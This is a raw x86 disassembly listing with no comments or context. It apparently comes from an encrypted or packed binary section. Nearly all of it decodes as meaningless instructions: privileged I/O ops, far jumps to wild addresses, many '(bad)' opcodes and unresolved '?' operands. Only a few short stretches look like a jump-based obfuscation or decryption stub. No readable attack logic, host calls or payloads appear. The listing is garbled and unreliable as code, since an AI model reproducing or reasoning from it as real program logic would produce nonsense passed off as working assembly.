  40fdf2:	jg     0x40fe50
  40fdf4:	rcr    BYTE PTR [ebp+0x598e54f4],0xcf
  40fdfb:	push   ss
  40fdfc:	and    cl,BYTE PTR [ecx-0x72421f4c]
  40fe02:	int    0xac
  40fe04:	imul   edx,DWORD PTR [edi+0x36],0x7a
  40fe08:	adc    al,0x6c
  40fe0a:	fwait
  40fe0b:	fwait
  40fe0c:	inc    ebx
  40fe0d:	mov    eax,0xe77641d4
  40fe12:	aam    0x65
  40fe14:	mov    al,ds:0x5351489b
  40fe19:	test   DWORD PTR [ebx-0x42964447],0xd4c555c1
  40fe23:	xchg   DWORD PTR [edx-0x444bf21d],edx
  40fe29:	sti    
  40fe2a:	in     al,0x41
  40fe2c:	fmul   QWORD PTR [edi]
  40fe2e:	and    eax,0xc4c9c821
  40fe33:	jmp    0x7763c5b3
  40fe38:	jl     0x40fe35
  40fe3a:	mov    dl,cl
  40fe3c:	adc    eax,0x651e525
  40fe41:	jp     0x40fdf2
  40fe43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe44:	hlt    
  40fe45:	sub    ebx,DWORD PTR [ecx]
  40fe47:	jge    0x40fe10
  40fe49:	adc    al,0xf4
  40fe4b:	test   eax,0x14e20175
  40fe50:	pop    ebx
  40fe51:	call   0x5c65:0xa49b9ef8
  40fe58:	and    BYTE PTR [ebx],dl
  40fe5a:	int3   
  40fe5b:	mov    cl,0xc
  40fe5d:	adc    ch,al
  40fe5f:	out    dx,eax
  40fe60:	scas   al,BYTE PTR es:[edi]
  40fe61:	jmp    0xa1b8:0x33632d8d
  40fe68:	int    0x9b
  40fe6a:	adc    eax,0xc112f0f7
  40fe6f:	xor    DWORD PTR [edx-0x74b23780],esp
  40fe75:	add    al,0x5b
  40fe77:	scas   eax,DWORD PTR es:[edi]
  40fe78:	fs xor al,0x59
  40fe7b:	mov    ecx,0xb51dcfad
  40fe80:	dec    esp
  40fe81:	fstp   DWORD PTR [edx+0x2]
  40fe84:	stc    
  40fe85:	mov    DWORD PTR [esi],ecx
  40fe87:	nop
  40fe88:	retf   0x5fd2
  40fe8b:	add    ecx,DWORD PTR [ecx+0x4c345e2f]
  40fe91:	lock push edi
  40fe93:	ins    BYTE PTR es:[edi],dx
  40fe94:	out    0xd5,al
  40fe96:	idiv   ah
  40fe98:	adc    al,0x50
  40fe9a:	cmp    dl,BYTE PTR [eax]
  40fe9c:	xchg   esi,eax
  40fe9d:	cld    
  40fe9e:	lock cmp ebp,DWORD PTR [edi]
  40fea1:	ja     0x40ff15
  40fea3:	pop    ebp
  40fea4:	sbb    esp,DWORD PTR [ebx]
  40fea6:	in     al,0x2c
  40fea8:	pop    esp
  40fea9:	push   es
  40feaa:	es mov edi,0xfa47d04c
  40feb0:	or     dh,BYTE PTR ds:0xdc9023b7
  40feb6:	call   0xbd1bcc00
  40febb:	dec    esi
  40febc:	jae    0x40fe3f
  40febe:	mov    cl,0x3b
  40fec0:	mov    ecx,0x13fbcdd5
  40fec5:	mov    BYTE PTR ds:0xfba077a7,cl
  40fecb:	jecxz  0x40ff4b
  40fecd:	jns    0x40ff4c
  40fecf:	cld    
  40fed0:	adc    DWORD PTR [esi],esp
  40fed2:	iret   
  40fed3:	jno    0x40fe66
  40fed5:	or     al,0x88
  40fed7:	pop    esi
  40fed8:	sbb    BYTE PTR [ecx],bl
  40feda:	mov    cl,BYTE PTR [eax+0x7f]
  40fedd:	cs pop ds
  40fedf:	shl    DWORD PTR [ebx],cl
  40fee1:	dec    edi
  40fee2:	in     al,0x42
  40fee4:	push   es
  40fee5:	push   cs
  40fee6:	sbb    al,0xd2
  40fee8:	pop    ebp
  40fee9:	out    0x66,al
  40feeb:	add    DWORD PTR [edi+0x2d02f9bb],edi
  40fef1:	pop    edi
  40fef2:	push   es
  40fef3:	rcr    dl,0xef
  40fef6:	into   
  40fef7:	and    eax,0x83850058
  40fefc:	mov    edi,0x56cd79cc
  40ff01:	into   
  40ff02:	mov    edx,0xc6185d35
  40ff07:	push   edx
  40ff08:	and    BYTE PTR [esp+eax*4+0x6e],0xf7
  40ff0d:	push   ebx
  40ff0e:	hlt    
  40ff0f:	ins    DWORD PTR es:[edi],dx
  40ff10:	fs dec ebx
  40ff12:	sbb    bl,BYTE PTR [edi+ebx*1]
  40ff15:	add    BYTE PTR [eax],0x33
  40ff18:	jecxz  0x40ff89
  40ff1a:	mov    ebp,0x58e9227d
  40ff1f:	bound  ecx,QWORD PTR [ebp-0x22]
  40ff22:	imul   esi,DWORD PTR [ebx-0x7],0xa403ae85
  40ff29:	push   ebp
  40ff2a:	cdq    
  40ff2b:	repnz or esi,eax
  40ff2e:	repnz rol DWORD PTR [eax],1
  40ff31:	or     al,0x1c
  40ff33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff34:	push   ss
  40ff35:	mov    ch,0x19
  40ff37:	xor    WORD PTR [edi-0x2b],dx
  40ff3b:	push   eax
  40ff3c:	push   ds
  40ff3d:	jg     0x40ff01
  40ff3f:	jle    0x40ff96
  40ff41:	mov    eax,ds:0x9b11ddb4
  40ff46:	sbb    eax,0xd4b897e5
  40ff4b:	into   
  40ff4c:	cwde   
  40ff4d:	push   ebx
  40ff4e:	push   0x3ffcebb9
  40ff53:	data16 jns 0x40fee8
  40ff56:	scas   al,BYTE PTR es:[edi]
  40ff57:	enter  0x1fc8,0xab
  40ff5b:	pop    ecx
  40ff5c:	mov    ebx,0x109d6388
  40ff61:	jns    0x40ff9d
  40ff63:	xlat   BYTE PTR ds:[ebx]
  40ff64:	sub    BYTE PTR [ebp-0x11],0x19
  40ff68:	(bad)  
  40ff69:	das    
  40ff6a:	jp     0x40ffea
  40ff6c:	mov    bl,0x88
  40ff6e:	into   
  40ff6f:	into   
  40ff70:	mov    edx,0x8a95ebb2
  40ff75:	sbb    al,0xa6
  40ff77:	and    bl,cl
  40ff79:	(bad)  
  40ff7a:	sahf   
  40ff7b:	(bad)  
  40ff7c:	jp     0x40ffe2
  40ff7e:	rol    DWORD PTR [eax+edx*4],0x7b
  40ff82:	out    0xf,al
  40ff84:	cmp    DWORD PTR [ecx],edx
  40ff86:	and    DWORD PTR [edx-0xb],0xffffff96
  40ff8a:	pop    es
  40ff8b:	ficom  DWORD PTR [ebx+0x351dc00c]
  40ff91:	adc    DWORD PTR [esi+0x6e],eax
  40ff94:	jl     0x40ffc3
  40ff96:	jg     0x40ff72
  40ff98:	jae    0x40fff4
  40ff9a:	push   esp
  40ff9b:	pop    esp
  40ff9c:	shl    eax,0xda
  40ff9f:	shr    bh,1
  40ffa1:	or     DWORD PTR [esi],0xffffffc6
  40ffa4:	ror    DWORD PTR [esi-0x47],0x59
  40ffa8:	xchg   ebx,eax
  40ffa9:	lds    eax,FWORD PTR [ebp+ebx*8+0x9addcdc]
  40ffb0:	cwde   
  40ffb1:	push   edx
  40ffb2:	lock jno 0x40ff58
  40ffb5:	gs mov edi,0xa0c16017
  40ffbb:	mov    BYTE PTR [edi-0x312e1035],al
  40ffc1:	xor    al,0x55
  40ffc3:	mov    dl,0x4c
  40ffc5:	lds    ebx,FWORD PTR [ebp+0x737cf784]
  40ffcb:	stos   BYTE PTR es:[edi],al
  40ffcc:	push   edx
  40ffcd:	xchg   DWORD PTR [eax+edi*8+0x3b9ddd88],ecx
  40ffd4:	inc    ebx
  40ffd5:	cmp    al,0xab
  40ffd7:	sbb    esi,ebp
  40ffd9:	pop    edi
  40ffda:	sub    BYTE PTR [edx+0x6a],ch
  40ffdd:	jp     0x410038
  40ffdf:	adc    edx,DWORD PTR [edi+0x2c]
  40ffe2:	es (bad) 
  40ffe4:	push   ss
  40ffe5:	xor    DWORD PTR [esi],edi
  40ffe7:	or     BYTE PTR [eax],bh
  40ffe9:	xor    al,ah
  40ffeb:	jno    0x40ff76
  40ffed:	push   ss
  40ffee:	pushf  
  40ffef:	retf   
  40fff0:	xchg   edx,eax
  40fff1:	outs   dx,BYTE PTR ds:[esi]
  40fff2:	sbb    DWORD PTR [ebx],ebp
  40fff4:	add    eax,0x7acb32a1
  40fff9:	inc    edx
  40fffa:	adc    bh,BYTE PTR [ebp-0x2536285a]
  410000:	push   ebp
  410001:	jne    0x40ffea
  410003:	test   BYTE PTR [esi+0x71e724a7],al
  410009:	jbe    0x41005d
  41000b:	mov    cl,0xa0
  41000d:	sub    BYTE PTR fs:[esp+edi*4+0x79a561c9],dh
  410015:	clc    
  410016:	pushf  
  410017:	bound  edi,QWORD PTR [eax]
  410019:	mov    BYTE PTR [ebx-0x53],bh
  41001c:	push   ebp
  41001d:	mov    edx,0x9619bc2f
  410022:	leave  
  410023:	and    ebp,DWORD PTR [ecx+0x5dff3045]
  410029:	dec    ecx
  41002a:	fild   WORD PTR cs:[esi-0x21]
  41002e:	xor    al,0x46
  410030:	xor    esp,ebx
  410032:	mov    ebx,DWORD PTR [ebp-0x10]
  410035:	sub    ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	push   esi
  410069:	sbb    cl,bl
  41006b:	enter  0x48e7,0x78
  41006f:	js     0x410056
  410071:	jle    0x4100eb
  410073:	js     0x410045
  410075:	xor    eax,0x39dd6252
  41007a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41007b:	cwde   
  41007c:	repnz lahf 
  41007e:	push   eax
  41007f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410080:	pop    ss
  410081:	sbb    edi,DWORD PTR [ebx-0x80]
  410084:	mov    ah,0x3c
  410086:	jg     0x4100e1
  410088:	mov    edx,0xc00e9fb3
  41008d:	or     ch,ch
  41008f:	call   0x5a07ab21
  410094:	aaa    
  410095:	popf   
  410096:	shl    BYTE PTR [edi],1
  410098:	popa   
  410099:	jno    0x4100a3
  41009b:	jne    0x41005e
  41009d:	xor    al,0xac
  41009f:	ds out dx,eax
  4100a1:	xchg   ebx,eax
  4100a2:	cmp    BYTE PTR [ebp-0x50],ah
  4100a5:	cmp    eax,0xe0c30ba9
  4100aa:	and    ebx,ebp
  4100ac:	jnp    0x410087
  4100ae:	sbb    al,dh
  4100b0:	into   
  4100b1:	xchg   ecx,eax
  4100b2:	mov    cl,0xb5
  4100b4:	and    DWORD PTR [esi+0x63],eax
  4100b7:	mov    DWORD PTR [esi-0x6b1e306b],edx
  4100bd:	test   BYTE PTR [edi+0x32],0x78
  4100c1:	clc    
  4100c2:	dec    edx
  4100c3:	lods   eax,DWORD PTR ds:[esi]
  4100c4:	(bad)  
  4100c5:	(bad)  
  4100c6:	sti    
  4100c7:	mov    edi,0x1e9ef76a
  4100cc:	xlat   BYTE PTR ds:[ebx]
  4100cd:	adc    BYTE PTR [eax+0x2d76a5b0],cl
  4100d3:	and    al,BYTE PTR [ecx]
  4100d5:	push   ds
  4100d6:	dec    eax
  4100d7:	fucomp st(7)
  4100d9:	cmp    cl,cl
  4100db:	sbb    al,BYTE PTR [ebx+esi*8+0xe]
  4100df:	jmp    0x8bdead30
  4100e4:	cs test al,0x58
  4100e7:	mov    WORD PTR [esi-0xe],ss
  4100ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100eb:	fmul   DWORD PTR [edi-0x32d59372]
  4100f1:	hlt    
  4100f2:	jb     0x4100b4
  4100f4:	rcr    DWORD PTR [esp+eiz*8+0x375f7c1f],0xeb
  4100fc:	xchg   ecx,eax
  4100fd:	or     BYTE PTR [eax],dl
  4100ff:	inc    ebx
  410100:	jmp    0x471d:0xfdf2b55e
  410107:	push   ecx
  410108:	pushf  
  410109:	scas   eax,DWORD PTR es:[edi]
  41010a:	pop    ebx
  41010b:	scas   eax,DWORD PTR es:[edi]
  41010c:	shl    bh,1
  41010e:	fisttp QWORD PTR [eax+0x7729be80]
  410114:	nop
  410115:	enter  0x1b63,0xcd
  410119:	sbb    DWORD PTR [edi],ecx
  41011b:	or     ch,cl
  41011d:	rcl    BYTE PTR [ebx+ebp*4+0x2a8659d6],0x38
  410125:	popf   
  410126:	inc    ecx
  410127:	mov    al,ds:0x21def933
  41012c:	mov    fs,ebp
  41012e:	pop    es
  41012f:	jp     0x4101a3
  410131:	sub    al,0x83
  410133:	aad    0x64
  410135:	mov    esi,DWORD PTR [ebx+0x5e43d38f]
  41013b:	sahf   
  41013c:	popa   
  41013d:	cmp    BYTE PTR [ecx],al
  41013f:	(bad)  
  410140:	push   ebx
  410141:	data16 into 
  410143:	imul   edi,DWORD PTR [esi+0x3b30ad83],0x643b29d9
  41014d:	mov    ch,0x8d
  41014f:	enter  0x411e,0x1f
  410153:	mov    ecx,0x64a98fa7
  410158:	shr    eax,cl
  41015a:	xchg   edi,eax
  41015b:	add    al,BYTE PTR [edx+0x73]
  41015e:	and    eax,0x46848a0e
  410163:	(bad)  
  410164:	(bad)  
  410165:	push   ebp
  410166:	loop   0x41010e
  410168:	jmp    0x4101a7
  41016a:	es in  al,0x2e
  41016d:	div    DWORD PTR [edi-0x60]
  410170:	hlt    
  410171:	loop   0x410127
  410173:	sub    BYTE PTR [ebx],0xd0
  410176:	cmc    
  410177:	xor    ch,dh
  410179:	and    BYTE PTR [eax],bl
  41017b:	hlt    
  41017c:	xchg   al,ch
  41017e:	xor    BYTE PTR [ebp-0xe],bh
  410181:	clc    
  410182:	jge    0x41016c
  410184:	add    bl,BYTE PTR [esi+0x66]
  410187:	or     ah,cl
  410189:	aad    0x58
  41018b:	cld    
  41018c:	jge    0x410206
  41018e:	sub    cl,BYTE PTR [eax-0x3253b263]
  410194:	xchg   ebp,eax
  410195:	xchg   DWORD PTR [eax+0x6a],esp
  410198:	jae    0x4101c8
  41019a:	icebp  
  41019b:	sub    ch,BYTE PTR [ecx]
  41019d:	retf   0xe849
  4101a0:	xchg   ecx,eax
  4101a1:	jmp    0x9c4f:0xd2db95b4
  4101a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101a9:	pop    esp
  4101aa:	test   al,0x5c
  4101ac:	sbb    al,0xfe
  4101ae:	mov    ebx,0x4bfc617a
  4101b3:	icebp  
  4101b4:	push   0x41c8be65
  4101b9:	cmp    ch,dl
  4101bb:	test   BYTE PTR [ebp-0x5279e531],dl
  4101c1:	jnp    0x410220
  4101c3:	mov    ds:0x21cbf431,eax
  4101c8:	bound  ecx,QWORD PTR [ecx]
  4101ca:	int    0x57
  4101cc:	cdq    
  4101cd:	in     al,0xc2
  4101cf:	dec    edi
  4101d0:	or     dl,BYTE PTR [edi-0x797d8869]
  4101d6:	xor    ch,bl
  4101d8:	xor    BYTE PTR [ebp+0x71],dh
  4101db:	push   ds
  4101dc:	out    0xbb,eax
  4101de:	xchg   bh,bl
  4101e0:	mov    ch,0xef
  4101e2:	mov    ch,BYTE PTR [esi+ebp*4+0x11]
  4101e6:	fs push ds
  4101e8:	and    ah,bh
  4101ea:	adc    al,0xcc
  4101ec:	mov    eax,0xffa81622
  4101f1:	mov    edx,ebx
  4101f3:	in     al,dx
  4101f4:	sbb    eax,0x76afb347
  4101f9:	fisttp DWORD PTR [esi+eax*1+0x26]
  4101fd:	in     eax,dx
  4101fe:	cmp    eax,0xa5602ae8
  410203:	and    DWORD PTR [edx+0x73e36ee7],edi
  410209:	fist   DWORD PTR [ebx+0x12]
  41020c:	jmp    0x3a91:0xaff9fcad
  410213:	jmp    0xd34f:0x28da593b
  41021a:	loope  0x4101ef
  41021c:	push   esp
  41021d:	cli    
  41021e:	pop    edx
  41021f:	out    0x3a,al
  410221:	cs cmp eax,0x18ff14f6
  410227:	adc    cl,BYTE PTR [esi-0x676b0e39]
  41022d:	push   cs
  41022e:	add    DWORD PTR [ecx-0x45],ebx
  410231:	cld    
  410232:	retf   
  410233:	or     al,ah
  410235:	(bad)  
  410236:	ficom  WORD PTR [ebx]
  410238:	pop    eax
  410239:	(bad)  
  41023a:	in     eax,dx
  41023b:	jnp    0x410231
  41023d:	jge    0x410231
  41023f:	xor    al,0x6
  410241:	sub    eax,0x11f39e57
  410246:	dec    edi
  410247:	scas   eax,DWORD PTR es:[edi]
  410248:	jge    0x4102b5
  41024a:	adc    al,0x4e
  41024c:	sub    al,0x28
  41024e:	ja     0x41024b
  410250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410251:	cmp    ecx,DWORD PTR [esi+0x7f]
  410254:	inc    edi
  410255:	leave  
  410256:	mov    ss,WORD PTR [ecx+0x51451548]
  41025c:	out    0x6d,eax
  41025e:	cmp    eax,0xcfe78839
  410263:	cmp    eax,eax
  410265:	pop    ecx
  410266:	push   cs
  410267:	cmp    edx,ebp
  410269:	mov    ?,WORD PTR [ebx+edi*8-0x76]
  41026d:	cmp    esp,DWORD PTR [edx-0x51]
  410270:	pop    esp
  410271:	sub    edx,DWORD PTR [ebp+ecx*1-0x1c]
  410275:	xchg   ecx,eax
  410276:	push   ss
  410277:	dec    esi
  410278:	xchg   esi,eax
  410279:	les    ebp,FWORD PTR [edx+0x68]
  41027c:	inc    ebp
  41027d:	test   BYTE PTR [ebx],0x79
  410280:	add    esp,ebx
  410282:	rcl    DWORD PTR [eax-0x66],1
  410285:	cmp    DWORD PTR [esi],edx
  410287:	or     DWORD PTR [edi+0x2d72c81],0x4dfeb34c
  410291:	mov    esp,0x8bf3c9f2
  410296:	ins    BYTE PTR es:[edi],dx
  410297:	fwait
  410298:	sub    al,0x52
  41029a:	lock jmp 0x4102b4
  41029d:	mov    WORD PTR [eax-0x3bc4ca4b],?
  4102a3:	imul   ecx,DWORD PTR ss:[esi],0x954d1aee
  4102aa:	test   BYTE PTR [edx+0x42798689],bl
  4102b0:	pop    eax
  4102b1:	(bad)  
  4102b2:	push   ecx
  4102b3:	outs   dx,DWORD PTR ds:[esi]
  4102b4:	cmc    
  4102b5:	clc    
  4102b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102b7:	(bad)  
  4102b8:	dec    eax
  4102b9:	outs   dx,BYTE PTR ds:[esi]
  4102ba:	xchg   edx,eax
  4102bb:	dec    edi
  4102bc:	shl    WORD PTR [eax+0x5e],cl
  4102c0:	mov    ds:0x7054640,al
  4102c5:	(bad)  
  4102c6:	and    al,0x78
  4102c8:	mov    bh,0xa7
  4102ca:	push   0x735a4048
  4102cf:	mov    cl,0x8c
  4102d1:	stc    
  4102d2:	dec    esp
  4102d3:	cmc    
  4102d4:	fbstp  TBYTE PTR [edx-0x21]
  4102d7:	pop    ebp
  4102d8:	inc    edi
  4102d9:	mov    dh,0xc5
  4102db:	pusha  
  4102dc:	jne    0x41034f
  4102de:	repz add edx,ecx
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	fimul  DWORD PTR [edx+0x4e4cba4f]
  4102f8:	js     0x410372
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	scas   al,BYTE PTR es:[edi]
  4102ff:	scas   eax,DWORD PTR es:[edi]
  410300:	jae    0x410335
  410302:	stos   BYTE PTR es:[edi],al
  410303:	mov    dh,0x9d
  410305:	pop    ss
  410306:	cmp    dh,BYTE PTR [edx-0x80]
  410309:	push   ss
  41030a:	mov    al,0xe9
  41030c:	xchg   ebp,eax
  41030d:	mov    ds:0x9901973a,eax
  410312:	sbb    eax,0x4e779388
  410317:	gs add eax,0xe0e89662
  41031d:	or     eax,0x1ce7b236
  410322:	mov    ecx,0x95c531b6
  410327:	push   esp
  410328:	add    eax,0x5b404c49
  41032d:	lahf   
  41032e:	pop    ebx
  41032f:	mov    ds:0x8b76d186,eax
  410334:	cli    
  410335:	inc    ebx
  410336:	xor    ah,BYTE PTR [eax-0x66b63de2]
  41033c:	dec    edi
  41033d:	or     BYTE PTR [edx],0x5e
  410340:	or     edx,DWORD PTR [eax+edi*8-0x5bdb3bd9]
  410347:	jmp    0x82bf:0xf6d0b09e
  41034e:	pusha  
  41034f:	popa   
  410350:	out    dx,al
  410351:	ss pop esi
  410353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410354:	jns    0x41031e
  410356:	xor    cl,BYTE PTR [ebp-0x5]
  410359:	mov    bh,ch
  41035b:	add    BYTE PTR [edx+0x2],dh
  41035e:	and    al,0x52
  410360:	xchg   DWORD PTR [edx+0x54],esp
  410363:	test   BYTE PTR [esi-0x1a],dl
  410366:	xor    DWORD PTR [ebp+0x56053a7a],ebp
  41036c:	mov    ebp,0xe78369cb
  410371:	lahf   
  410372:	lds    ecx,FWORD PTR [edx-0x7d]
  410375:	(bad)  
  410377:	add    al,0xd7
  410379:	repz push ecx
  41037b:	jle    0x410359
  41037d:	pop    eax
  41037e:	mov    ch,0x6b
  410380:	sahf   
  410381:	fild   WORD PTR [ecx]
  410383:	(bad)  
  410385:	ror    BYTE PTR [ebx+0x13],cl
  410388:	pop    ebp
  410389:	(bad)
  41038c:	add    dh,BYTE PTR [esi]
  41038e:	dec    ecx
  41038f:	popf   
  410390:	arpl   WORD PTR [ebp-0x42],di
  410393:	inc    eax
  410394:	daa    
  410395:	jge    0x41038d
  410397:	jbe    0x4103cf
  410399:	xchg   esi,eax
  41039a:	add    dl,BYTE PTR ds:0xc6bb7dfe
  4103a0:	into   
  4103a1:	mov    ds,WORD PTR [edx]
  4103a3:	call   0x99aa:0x274beaca
  4103aa:	out    0x8f,eax
  4103ac:	loopne 0x410402
  4103ae:	add    eax,0x7da089e1
  4103b3:	jbe    0x41039a
  4103b5:	or     ebp,DWORD PTR [eax+0x8]
  4103b8:	aad    0x7f
  4103ba:	bound  edx,QWORD PTR [ebx+0x58]
  4103bd:	sbb    edx,DWORD PTR [ebx-0x46]
  4103c0:	or     eax,0x38cd8579
  4103c5:	imul   edx,DWORD PTR [esi+0x33563d5b],0xfffffffb
  4103cc:	in     eax,dx
  4103cd:	bound  ebx,QWORD PTR [eax-0x73a68f10]
  4103d3:	xor    eax,0xc7ee9c8a
  4103d8:	and    DWORD PTR ds:0x655e2b7f,edx
  4103de:	adc    ecx,DWORD PTR [esi-0x2a]
  4103e1:	daa    
  4103e2:	mov    eax,ds:0x6479a10d
  4103e7:	mov    ebx,0x26c1a32a
  4103ec:	shl    DWORD PTR [ebp-0x37],0x69
  4103f0:	jmp    0x4103dc
  4103f2:	aaa    
  4103f3:	mov    dh,0xfa
  4103f5:	mov    edx,ebp
  4103f7:	cwde   
  4103f8:	pop    esi
  4103f9:	or     BYTE PTR [edx],0xbf
  4103fc:	mov    bh,0x98
  4103fe:	lods   eax,DWORD PTR ds:[esi]
  4103ff:	sub    esp,eax
  410401:	arpl   WORD PTR [esp+ebp*8-0x11],ax
  410405:	sbb    ebp,edi
  410407:	call   0x5bf8:0x810c6e75
  41040e:	data16 jl 0x410441
  410411:	loope  0x4103e2
  410413:	mov    edi,esp
  410415:	out    0xe,al
  410417:	mul    BYTE PTR [ebp+0x4adf9f59]
  41041d:	or     ax,0x2bfc
  410421:	loopne 0x41049f
  410423:	aam    0x44
  410425:	or     al,dl
  410427:	loop   0x41046b
  410429:	lock lds edi,FWORD PTR [eax]
  41042c:	xchg   esi,eax
  41042d:	mov    ebx,0x9680f2b
  410432:	in     al,0x47
  410434:	ss (bad) 
  410436:	sbb    ebp,ebp
  410438:	pop    edi
  410439:	push   DWORD PTR [ecx]
  41043b:	xchg   ebp,eax
  41043c:	sbb    al,0xae
  41043e:	rcr    DWORD PTR [edx+eiz*8],1
  410441:	add    al,dl
  410443:	jnp    0x4104b3
  410445:	push   ecx
  410446:	xchg   edx,eax
  410447:	sbb    BYTE PTR [edi+0x27],cl
  41044a:	xchg   edx,eax
  41044b:	xor    DWORD PTR [edi],esi
  41044d:	test   eax,0xb6989ca4
  410452:	jle    0x410423
  410454:	(bad)  
  410455:	in     eax,0xd8
  410457:	mov    eax,0x8ce42f68
  41045c:	jno    0x410456
  41045e:	and    al,0xe5
  410460:	and    eax,0xd2206a47
  410465:	aam    0x7c
  410467:	dec    ecx
  410468:	aad    0x9a
  41046a:	lods   al,BYTE PTR ds:[esi]
  41046b:	in     eax,0xb5
  41046d:	neg    BYTE PTR [ebp+0x1d]
  410470:	fdivr  st(5),st
  410472:	cmp    bl,BYTE PTR [edx]
  410474:	pop    ecx
  410475:	or     ch,BYTE PTR ds:[esi]
  410478:	adc    ebp,DWORD PTR [edx-0x5e0ec036]
  41047e:	cwde   
  41047f:	and    cl,BYTE PTR [edx-0x7b522767]
  410485:	pop    ebx
  410486:	(bad)  
  410487:	fs push es
  410489:	sbb    dh,ah
  41048b:	arpl   WORD PTR [ecx-0x3c2e14a4],dx
  410491:	inc    esp
  410492:	outs   dx,DWORD PTR ds:[esi]
  410493:	ins    BYTE PTR es:[edi],dx
  410494:	mov    bl,0xd6
  410496:	imul   esp,DWORD PTR [esi-0x8c0e228],0xbb8c0cdd
  4104a0:	aaa    
  4104a1:	adc    BYTE PTR [edi-0x3e2348c0],ah
  4104a7:	ret    
  4104a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a9:	pop    ebp
  4104aa:	jo     0x410485
  4104ac:	test   DWORD PTR [ebx],esi
  4104ae:	cs nop
  4104b0:	in     eax,0x8c
  4104b2:	sub    eax,0x879145b7
  4104b7:	(bad)  
  4104b8:	repnz dec edi
  4104ba:	call   0x44b6:0x4fd5726e
  4104c1:	shl    DWORD PTR [ebx-0x67],0xb6
  4104c5:	cld    
  4104c6:	fs push edx
  4104c8:	std    
  4104c9:	or     ebp,esp
  4104cb:	inc    edx
  4104cc:	xlat   BYTE PTR ds:[ebx]
  4104cd:	and    eax,0xb7b3d436
  4104d3:	mov    ch,0x77
  4104d5:	fimul  DWORD PTR [ebx-0x44]
  4104d8:	ins    BYTE PTR es:[edi],dx
  4104d9:	sbb    al,0x47
  4104db:	inc    edi
  4104dc:	add    dl,BYTE PTR [esi-0x6694b0ef]
  4104e2:	mov    bh,0x1c
  4104e4:	rcl    DWORD PTR [esi+0x4b],1
  4104e7:	push   ds
  4104e8:	lods   eax,DWORD PTR ds:[esi]
  4104e9:	arpl   WORD PTR [eax],cx
  4104eb:	jmp    DWORD PTR [ebp-0x159ce08]
  4104f1:	jns    0x41048f
  4104f3:	int    0x62
  4104f5:	xor    ah,BYTE PTR [eax+0x2695ba6f]
  4104fb:	bound  edi,QWORD PTR [esi]
  4104fd:	push   ecx
  4104fe:	repz xor DWORD PTR [ecx+eiz*8],edi
  410502:	out    dx,eax
  410503:	iret   
  410504:	add    ebp,0xae5d7f48
  41050a:	pop    esi
  41050b:	paddusb mm1,QWORD PTR [ecx]
  41050e:	in     eax,0x2
  410510:	and    BYTE PTR [ebx],dl
  410512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410513:	(bad)  
  410514:	imul   DWORD PTR [eax-0x3f0c3fbb]
  41051a:	pop    ebx
  41051b:	cli    
  41051c:	out    0xdc,al
  41051e:	pop    ebx
  41051f:	mov    edx,0x23cd117a
  410524:	xchg   BYTE PTR [ebx+edx*8],cl
  410527:	test   BYTE PTR [ecx-0x6b6669dd],0xb5
  41052e:	gs mov ch,0x71
  410531:	lds    esi,FWORD PTR [eax+0x350cb0de]
  410537:	stos   BYTE PTR es:[edi],al
  410538:	ins    BYTE PTR es:[edi],dx
  410539:	das    
  41053a:	(bad)  
  41053c:	or     al,0x53
  41053e:	(bad)  
  41053f:	in     al,0x7b
  410541:	ficom  DWORD PTR ds:0x1f14daca
  410547:	and    DWORD PTR [ebx+0x33],edx
  41054a:	mov    al,ds:0xc4b3ff29
  41054f:	cmp    al,0xe6
  410551:	and    eax,0x1c116dd0
  410556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410557:	fcomp  DWORD PTR ds:0x5a68139a
  41055d:	lds    edx,FWORD PTR [edx-0x1e83973c]
  410563:	jecxz  0x4105d8
  410565:	shr    ah,1
  410567:	adc    al,0x10
  410569:	imul   edx,edi
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	fdiv   QWORD PTR [edi]
  410585:	inc    esi
  410586:	cwde   
  410587:	cmp    DWORD PTR [ebx+0x78],edx
  41058a:	js     0x410571
  41058c:	jle    0x410606
  41058e:	js     0x4105a2
  410590:	fbstp  TBYTE PTR ds:0x715388d7
  410596:	dec    ecx
  410597:	inc    ebp
  410598:	add    BYTE PTR [edi],bl
  41059a:	test   al,0xf5
  41059c:	push   ss
  41059d:	and    DWORD PTR [esi-0x44684f90],eax
  4105a3:	lds    esi,FWORD PTR [edi]
  4105a5:	add    ebx,esi
  4105a7:	scas   eax,DWORD PTR es:[edi]
  4105a8:	lds    ebx,FWORD PTR [esi+0x5025f6ec]
  4105ae:	cmc    
  4105af:	fsubr  DWORD PTR [ebx+0x48b8d850]
  4105b5:	call   DWORD PTR [ecx+0x4f]
  4105b8:	adc    BYTE PTR [ecx],bl
